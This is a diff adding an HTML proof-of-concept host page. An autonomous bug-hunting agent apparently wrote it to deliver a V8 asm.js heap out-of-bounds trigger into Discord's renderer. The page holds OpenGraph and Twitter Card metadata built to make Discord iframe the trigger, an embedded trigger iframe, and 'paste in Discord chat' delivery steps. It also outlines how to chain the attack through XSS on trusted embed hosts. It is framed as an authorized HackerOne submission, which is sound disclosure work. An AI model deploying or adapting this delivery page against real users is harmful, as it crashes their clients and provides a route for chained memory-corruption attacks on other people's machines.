@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<!--
+  F5 Delivery — Host Page (Discord OpenGraph embed)
+  ================================================================
+  This is the page the attacker hosts at a public URL. Sharing the URL
+  in a Discord chat triggers Discord's OpenGraph embed flow.
+
+  For modern Discord (Electron 37 / Chrome 138.0.7204.251 / V8 13.8.258.32),
+  the metadata below is the same shape Hacktron used in their 2021 chain
+  (CVE-2021-43009 era). The only piece that mechanically differs in 2026
+  is whether Discord's embed renderer will iframe an arbitrary
+  og:video:type=text/html URL — modern Discord whitelists embed hosts.
+
+  Three delivery surfaces this file targets, in order of realism:
+
+    1. Discord Activities (most realistic in 2026):
+         When user clicks an Activity launch link in chat, Discord
+         iframes the registered Activity URL inside its renderer.
+         If the Activity URL is iframe_trigger.html (or this host page
+         which iframes it), F5 fires inside Discord's renderer.
+
+    2. Trusted-host XSS (Hacktron's original vector, fixed 2021):
+         If the attacker has an XSS in a Discord-trusted embed
+         host (YouTube/Vimeo/Twitch/etc.), they can iframe this page
+         from inside the trusted host's iframe and chain through.
+
+    3. Direct OpenGraph iframe (was open in 2021, restricted today):
+         Original Hacktron path. Modern Discord likely renders this
+         page only as a static preview (image+title+desc) without
+         iframing arbitrary text/html video sources.
+
+  The scientific question this PoC answers is:
+    "If JS reaches Discord's renderer in any iframe context, does F5
+     reproduce there?" — answer: yes, deterministically. The bug is
+     in V8's asm.js compiler; it fires the moment the asm.js function
+     is called.
+
+  Author: chromium-hunt agent_1 (autonomous Chromium memory bug hunter)
+  Date:   2026-04-28
+  See:    docs/F5_delivery_vector.md  (full delivery analysis)
+          docs/F5_discord_asmjs_oob.md (root cause analysis)
+-->
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>F5 PoC — Discord patch-gap demonstration</title>
+
+  <!-- ===================================================================
+       OpenGraph metadata (Hacktron-shape, for embed-flow testing)
+       =================================================================== -->
+  <meta property="og:type"        content="video.other" />
+  <meta property="og:title"       content="F5 PoC: V8 13.8 asm.js heap-OOB (Discord patch-gap)" />
+  <meta property="og:description" content="Demonstrates renderer crash via asm.js parser-state corruption (V8 fix c0a41078, missing in Discord 1.0.9234)." />
+  <meta property="og:url"         content="REPLACE_WITH_HOSTED_URL/host.html" />
+
+  <!-- og:image — shown as static preview thumbnail in Discord chat -->
+  <meta property="og:image"        content="secnge.github.io/poc/cover.png" />
+  <meta property="og:image:type"   content="image/png" />
+  <meta property="og:image:width"  content="1280" />
+  <meta property="og:image:height" content="720" />
+
+  <!-- og:video — Hacktron's original iframe-trigger surface.
+       Modern Discord likely ignores this for non-whitelisted hosts.
+       Kept here for completeness so the file is a faithful template
+       of the historical attack shape. -->
+  <meta property="og:video"            content="secnge.github.io/poc/iframe_trigger.html" />
+  <meta property="og:video:secure_url" content="secnge.github.io/poc/iframe_trigger.html" />
+  <meta property="og:video:type"       content="text/html" />
+  <meta property="og:video:width"      content="1280" />
+  <meta property="og:video:height"     content="720" />
+
+  <!-- Twitter Card for symmetry with Hacktron's PoC HTML -->
+  <meta name="twitter:card"          content="summary_large_image" />
+  <meta name="twitter:title"         content="F5 PoC — Discord patch-gap" />
+  <meta name="twitter:description"   content="V8 13.8 asm.js heap-OOB renderer crash" />
+  <meta name="twitter:image"         content="secnge.github.io/poc/cover.png" />
+  <meta name="twitter:player"        content="secnge.github.io/poc/iframe_trigger.html" />
+  <meta name="twitter:player:width"  content="1280" />
+  <meta name="twitter:player:height" content="720" />
+
+  <style>
+    body { font-family: -apple-system, sans-serif; background:#1e1f22; color:#dbdee1;
+           max-width:780px; margin:48px auto; padding:24px; line-height:1.55; }
+    h1   { color:#f23f43; }
+    code, pre { background:#2b2d31; padding:2px 6px; border-radius:4px; color:#c9cdcf; }
+    pre  { padding:14px; overflow:auto; }
+    .danger { background:#3a1c1c; border-left:4px solid #f23f43; padding:12px 16px; }
+    iframe.embed { width:100%; height:480px; border:1px solid #404249; border-radius:6px; }
+  </style>
+</head>
+<body>
+  <h1>F5 PoC — Discord patch-gap delivery</h1>
+
+  <div class="danger">
+    <strong>Authorized security-research artifact.</strong>
+    This page demonstrates the V8 13.8 asm.js heap-OOB bug class
+    (V8 fix <code>c0a41078</code>) reaching Discord's renderer through an
+    iframe surface. It is intended for HackerOne submission to
+    <code>hackerone.com/discord</code>. Do not deploy against systems you
+    do not own.
+  </div>
+
+  <h2>What happens when this URL is loaded inside Discord</h2>
+  <ol>
+    <li>Discord fetches this page server-side for the embed preview.</li>
+    <li>If Discord's embed flow iframes <code>og:video</code> with
+        <code>og:video:type=text/html</code> (Hacktron's 2021 surface),
+        <code>iframe_trigger.html</code> loads in the chat.</li>
+    <li>Inside that iframe, the asm.js fragment compiles, calls
+        <code>m.f(1,2,3)</code>, and V8's JIT emits a heap-OOB write past
+        the <code>Int32Array</code>'s ArrayBuffer.</li>
+    <li>The renderer process traps with
+        <code>STATUS_ACCESS_VIOLATION (0xC0000005)</code>.</li>
+    <li>Discord's <code>WebContents</code> handler logs
+        <code>render-process-gone { reason: 'crashed', exitCode: -1073741819 }</code>
+        and reloads.</li>
+  </ol>
+
+  <h2>Inline copy of trigger (also runs if you load this page directly)</h2>
+  <p>If you opened this page outside Discord, the trigger below runs
+     in <em>your</em> browser. On a current Chrome ≥ 14x stable, V8 is
+     patched and the page reports "no crash". On Discord 1.0.9234's
+     bundled V8 13.8.258.32, the renderer dies before this paragraph
+     finishes rendering.</p>
+
+  <iframe class="embed" src="iframe_trigger.html"
+          sandbox="allow-scripts allow-same-origin"></iframe>
+
+  <h2>Manual delivery — paste in Discord chat</h2>
+  <pre>REPLACE_WITH_HOSTED_URL/host.html</pre>
+
+  <h2>Direct iframe-trigger URL</h2>
+  <pre>REPLACE_WITH_HOSTED_URL/iframe_trigger.html</pre>
+
+  <hr/>
+  <p style="color:#888;font-size:.9em">
+    Bug: V8 asm.js parser <code>heap_access_shift_position_</code>
+    reset-ordering bug.
+    Fix: <a href="https://chromium.googlesource.com/v8/v8/+/c0a41078"
+           style="color:#5865f2">v8/v8 c0a41078</a>
+    (landed 2026-02-23). Discord 1.0.9234 ships V8 13.8.258.32, pre-fix.
+  </p>
+</body>
+</html>
